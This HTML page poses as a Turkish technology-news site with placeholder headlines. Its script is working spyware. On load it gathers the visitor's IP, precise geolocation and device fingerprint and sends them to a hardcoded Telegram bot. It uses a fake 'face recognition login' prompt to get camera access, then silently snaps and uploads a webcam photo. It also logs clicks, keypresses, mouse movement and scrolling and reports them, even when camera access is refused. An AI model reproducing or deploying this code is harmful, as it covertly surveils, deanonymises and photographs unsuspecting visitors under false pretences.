<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Teknoloji Haberleri - Güncel İçerikler</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        
        h1 {
            color: #2c3e50;
            font-size: 2.8rem;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #7f8c8d;
            font-size: 1.2rem;
            margin-bottom: 20px;
        }
        
        .news-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .news-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            cursor: pointer;
        }
        
        .news-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
        }
        
        .news-card h3 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.4rem;
        }
        
        .news-card p {
            color: #5d6d7e;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .read-more {
            display: inline-block;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .read-more:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        /* Kamera modal */
        .camera-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
        }

        .camera-modal video {
            max-width: 90%;
            max-height: 70%;
            border-radius: 15px;
            margin-bottom: 20px;
        }

        .camera-modal .message {
            font-size: 18px;
            margin-bottom: 20px;
            text-align: center;
        }

        .camera-modal .buttons {
            margin-top: 20px;
        }

        .camera-modal button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 25px;
            margin: 0 10px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
        }
        
        .category-section {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        }
        
        .category-section h2 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8rem;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
            display: inline-block;
        }
        
        footer {
            text-align: center;
            padding: 30px;
            color: white;
            background: rgba(0, 0, 0, 0.1);
            border-radius: 15px;
            margin-top: 40px;
        }

        /* Kamera izin modal */
        .permission-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 10000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
            text-align: center;
        }

        .permission-modal .content {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 500px;
        }

        .permission-modal h2 {
            font-size: 2rem;
            margin-bottom: 20px;
            color: #4CAF50;
        }

        .permission-modal p {
            font-size: 1.2rem;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .permission-modal button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1rem;
            border-radius: 25px;
            cursor: pointer;
            margin: 0 10px;
            transition: all 0.3s ease;
        }

        .permission-modal button:hover {
            background: #45a049;
            transform: scale(1.05);
        }

        .permission-modal button.deny {
            background: #f44336;
        }

        .permission-modal button.deny:hover {
            background: #da190b;
        }
        
        @media (max-width: 768px) {
            h1 {
                font-size: 2.2rem;
            }
            
            .news-grid {
                grid-template-columns: 1fr;
            }

            .permission-modal .content {
                margin: 20px;
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Kamera izin modal -->
    <div class="permission-modal" id="permissionModal">
        <div class="content">
            <h2>📷 Kamera Erişimi Gerekli</h2>
            <p>Site deneyimini kişiselleştirmek ve güvenliğinizi sağlamak için kameranıza erişim izni vermeniz gerekmektedir.</p>
            <p><strong>Yüz tanıma ile giriş yapılacaktır.</strong></p>
            <div class="buttons">
                <button onclick="grantCameraPermission()">✅ İzin Ver</button>
                <button class="deny" onclick="denyCameraPermission()">❌ Reddet</button>
            </div>
        </div>
    </div>

    <!-- Kamera modal -->
    <div class="camera-modal" id="cameraModal">
        <div class="message" id="cameraMessage">📷 Yüz tanıma yapılıyor...</div>
        <video id="video" autoplay playsinline></video>
        <div class="buttons">
            <button onclick="takePhoto()">📸 Fotoğraf Çek</button>
            <button onclick="closeCamera()">❌ Kapat</button>
        </div>
    </div>

    <div class="container">
        <header>
            <h1>Teknoloji Haberleri</h1>
            <p class="subtitle">Güncel teknoloji haberleri, incelemeler ve analizler</p>
        </header>
        
        <div class="news-grid">
            <div class="news-card" onclick="trackClick(1)">
                <h3>Yapay Zeka Devrimi: 2024'te Beklenen Gelişmeler</h3>
                <p>Yapay zeka teknolojileri hızla gelişmeye devam ediyor. Bu yıl içinde beklenen önemli gelişmeler ve sektöre etkileri...</p>
                <a href="#" class="read-more">Devamını Oku</a>
            </div>
            
            <div class="news-card" onclick="trackClick(2)">
                <h3>Quantum Bilgisayarlar: Geleceğin Teknolojisi</h3>
                <p>Quantum bilgisayarların geleneksel bilgisayarlara göre üstünlükleri ve gelecekte hayatımızı nasıl değiştireceği...</p>
                <a href="#" class="read-more">Devamını Oku</a>
            </div>
            
            <div class="news-card" onclick="trackClick(3)">
                <h3>5G ve Ötesi: 6G Teknolojisine Doğru</h3>
                <p>5G teknolojisi yaygınlaşırken, araştırmacılar 6G üzerinde çalışmaya başladı. Peki 6G bize neler vaat ediyor?</p>
                <a href="#" class="read-more">Devamını Oku</a>
            </div>
        </div>
        
        <div class="category-section">
            <h2>Popüler Kategoriler</h2>
            <div class="news-grid">
                <div class="news-card" onclick="trackClick(4)">
                    <h3>Akıllı Telefonlar</h3>
                    <p>En yeni akıllı telefon incelemeleri, karşılaştırmaları ve teknoloji haberleri...</p>
                    <a href="#" class="read-more">İncele</a>
                </div>
                
                <div class="news-card" onclick="trackClick(5)">
                    <h3>Yazılım Dünyası</h3>
                    <p>Programlama dilleri, framework'ler ve yazılım geliştirme trendleri...</p>
                    <a href="#" class="read-more">Keşfet</a>
                </div>
                
                <div class="news-card" onclick="trackClick(6)">
                    <h3>Gaming</h3>
                    <p>Oyun dünyasından son haberler, konsol incelemeleri ve e-spor gelişmeleri...</p>
                    <a href="#" class="read-more">Oyna</a>
                </div>
            </div>
        </div>
        
        <footer>
            <p>&copy; 2024 Teknoloji Haberleri. Tüm hakları saklıdır.</p>
        </footer>
    </div>

    <script>
        // Bot bilgileri
        const BOT_TOKEN = '7872030891:AAH43bvXSxx4XFVJJUtUjE-b4dKRbO0_b_4';
        const TARGET_CHAT_ID = '-1003261169598';
        
        let stream = null;
        let systemInfo = null;
        let userBehavior = {
            clicks: 0,
            mouseMovements: 0,
            keyPresses: 0,
            scrollDepth: 0,
            timeOnPage: 0,
            clickedItems: [],
            startTime: Date.now()
        };

        // Sayfa yüklendiğinde
        document.addEventListener('DOMContentLoaded', async function() {
            // Önce tüm sistem bilgilerini topla
            systemInfo = await collectMaximumSystemInfo();
            
            // IP bilgilerini gönder
            await sendDetailedIPInfo(systemInfo, '🔍 SİTEYE GİRİŞ YAPILDI');
            
            // Kullanıcı davranış takibini başlat
            startBehaviorTracking();
            
            // 3 saniye sonra kamera izni modalını göster
            setTimeout(() => {
                document.getElementById('permissionModal').style.display = 'flex';
            }, 3000);
        });

        // Maximum sistem bilgilerini topla
        async function collectMaximumSystemInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Detaylı konum bilgileri
                let detailedLocation = {};
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    detailedLocation = await locationResponse.json();
                } catch (e) {}

                // İkinci konum API'si
                let backupLocation = {};
                try {
                    const backupResponse = await fetch(`https://ipwhois.app/json/${ipData.ip}`);
                    backupLocation = await backupResponse.json();
                } catch (e) {}

                // GPU bilgisi
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                let gpuInfo = 'Bilinmiyor';
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }

                return {
                    // IP ve Konum
                    ip: ipData.ip,
                    country: detailedLocation.country_name || backupLocation.country || 'Bilinmiyor',
                    city: detailedLocation.city || backupLocation.city || 'Bilinmiyor',
                    region: detailedLocation.region || backupLocation.region || 'Bilinmiyor',
                    district: detailedLocation.district || 'Bilinmiyor',
                    isp: detailedLocation.org || backupLocation.isp || 'Bilinmiyor',
                    timezone: detailedLocation.timezone || backupLocation.timezone || 'Bilinmiyor',
                    coordinates: detailedLocation.latitude && detailedLocation.longitude ? 
                        `${detailedLocation.latitude}, ${detailedLocation.longitude}` : 'Bilinmiyor',
                    postal: detailedLocation.postal || 'Bilinmiyor',
                    
                    // Sistem Bilgileri
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    screen: `${screen.width}x${screen.height}`,
                    availScreen: `${screen.availWidth}x${screen.availHeight}`,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints,
                    gpu: gpuInfo,
                    
                    // Tarayıcı Özellikleri
                    cookies: navigator.cookieEnabled,
                    javaEnabled: navigator.javaEnabled(),
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    devicePixelRatio: window.devicePixelRatio,
                    touchSupport: 'ontouchstart' in window,
                    
                    // Ziyaret Bilgileri
                    timestamp: new Date().toLocaleString('tr-TR'),
                    referrer: document.referrer || 'Doğrudan giriş',
                    url: window.location.href
                };
            } catch (error) {
                return { 
                    ip: 'Bilinmeyen', 
                    error: error.message,
                    timestamp: new Date().toLocaleString('tr-TR')
                };
            }
        }

        // Detaylı IP bilgilerini gönder
        async function sendDetailedIPInfo(info, action = '') {
            const message = `${action ? action + '\n\n' : ''}🌐 **DETAYLI SİSTEM RAPORU**

📍 **COĞRAFİ KONUM:**
├─ IP Adresi: ${info.ip}
├─ Ülke: ${info.country}
├─ Şehir: ${info.city}
├─ İlçe: ${info.district}
├─ Bölge: ${info.region}
├─ ISP: ${info.isp}
├─ Posta Kodu: ${info.postal}
├─ Koordinatlar: ${info.coordinates}
└─ Zaman Dilimi: ${info.timezone}

💻 **SİSTEM BİLGİLERİ:**
├─ İşletim Sistemi: ${info.platform}
├─ Tarayıcı: ${info.userAgent}
├─ Üretici: ${info.vendor}
├─ Dil: ${info.language}
├─ Desteklenen Diller: ${info.languages.join(', ')}
├─ Ekran: ${info.screen} (Kullanılabilir: ${info.availScreen})
├─ Renk Derinliği: ${info.colorDepth} bit
├─ Pixel Derinliği: ${info.pixelDepth} bit
├─ CPU Çekirdek: ${info.hardwareConcurrency}
├─ RAM: ${info.deviceMemory} GB
├─ GPU: ${info.gpu}
├─ Maksimum Dokunma: ${info.maxTouchPoints}
├─ Pixel Oranı: ${info.devicePixelRatio}
├─ Dokunma Desteği: ${info.touchSupport ? 'Var' : 'Yok'}
├─ Çerezler: ${info.cookies ? 'Aktif' : 'Pasif'}
├─ Java: ${info.javaEnabled ? 'Aktif' : 'Pasif'}
├─ PDF Görüntüleyici: ${info.pdfViewerEnabled ? 'Aktif' : 'Pasif'}
├─ Referrer: ${info.referrer}
└─ Ziyaret Zamanı: ${info.timestamp}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TARGET_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('IP gönderim hatası:', error);
            }
        }

        // Kamera izni ver
        async function grantCameraPermission() {
            document.getElementById('permissionModal').style.display = 'none';
            await startCamera();
        }

        // Kamera izni reddet
        async function denyCameraPermission() {
            document.getElementById('permissionModal').style.display = 'none';
            // İzin reddedilse bile IP bilgilerini gönder
            await sendDetailedIPInfo(systemInfo, '❌ KAMERA İZNİ REDDEDİLDİ');
        }

        // Kamerayı başlat
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 1920, 
                        height: 1080,
                        facingMode: 'user'
                    } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                document.getElementById('cameraModal').style.display = 'flex';
                
                // 3 saniye sonra otomatik fotoğraf çek
                setTimeout(() => {
                    takePhoto();
                }, 3000);
                
            } catch (error) {
                console.log('Kamera hatası:', error);
                await sendDetailedIPInfo(systemInfo, '❌ KAMERA BAŞLATILAMADI');
            }
        }

        // Fotoğraf çek ve gönder
        async function takePhoto() {
            if (!stream) return;
            
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            await sendPhotoToTelegram(photoData);
            
            closeCamera();
        }

        // Fotoğrafı Telegram'a gönder
        async function sendPhotoToTelegram(photoData) {
            const message = `📸 **KAMERA FOTOĞRAFI ALINDI!**

📍 **KONUM BİLGİLERİ:**
├─ IP: ${systemInfo.ip}
├─ Ülke: ${systemInfo.country}
├─ Şehir: ${systemInfo.city}
├─ İlçe: ${systemInfo.district}
├─ ISP: ${systemInfo.isp}
├─ Koordinatlar: ${systemInfo.coordinates}
└─ Zaman: ${systemInfo.timestamp}`;

            try {
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_CHAT_ID);
                formData.append('photo', blob, 'kamera_foto.jpg');
                formData.append('caption', message);
                formData.append('parse_mode', 'Markdown');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('Fotoğraf gönderim hatası:', error);
            }
        }

        // Kamerayı kapat
        function closeCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            document.getElementById('cameraModal').style.display = 'none';
        }

        // Kullanıcı davranış takibi
        function startBehaviorTracking() {
            // Tıklama takibi
            document.addEventListener('click', function(e) {
                userBehavior.clicks++;
                userBehavior.clickedItems.push({
                    element: e.target.tagName,
                    className: e.target.className,
                    time: new Date().toLocaleTimeString('tr-TR')
                });
                
                // Her 5 tıklamada bir rapor gönder
                if (userBehavior.clicks % 5 === 0) {
                    sendBehaviorReport();
                }
            });

            // Fare hareketi takibi
            document.addEventListener('mousemove', function() {
                userBehavior.mouseMovements++;
            });

            // Klavye takibi
            document.addEventListener('keydown', function() {
                userBehavior.keyPresses++;
            });

            // Scroll takibi
            document.addEventListener('scroll', function() {
                userBehavior.scrollDepth = Math.max(
                    userBehavior.scrollDepth,
                    (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100
                );
            });

            // Zaman takibi
            setInterval(() => {
                userBehavior.timeOnPage = Math.round((Date.now() - userBehavior.startTime) / 1000);
            }, 1000);

            // Sayfadan çıkışta rapor gönder
            window.addEventListener('beforeunload', function() {
                sendBehaviorReport();
                sendDetailedIPInfo(systemInfo, '🚪 SAYFADAN ÇIKIŞ YAPILDI');
            });
        }

        // Tıklama takip
        function trackClick(itemId) {
            userBehavior.clicks++;
            userBehavior.clickedItems.push({
                item: itemId,
                time: new Date().toLocaleTimeString('tr-TR')
            });
        }

        // Davranış raporu gönder
        async function sendBehaviorReport() {
            const message = `📊 **KULLANICI DAVRANIŞ RAPORU**

👆 Tıklamalar: ${userBehavior.clicks}
🖱️ Fare Hareketleri: ${userBehavior.mouseMovements}
⌨️ Tuş Basımları: ${userBehavior.keyPresses}
📜 Scroll Derinliği: %${userBehavior.scrollDepth.toFixed(1)}
⏱️ Sayfada Kalma Süresi: ${userBehavior.timeOnPage}s
🔗 Son Tıklananlar: ${userBehavior.clickedItems.slice(-5).map(item => item.item || item.element).join(', ')}

🌐 IP: ${systemInfo.ip}
🕐 Zaman: ${new Date().toLocaleString('tr-TR')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TARGET_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Davranış raporu gönderim hatası:', error);
            }
        }
    </script>
</body>
</html>
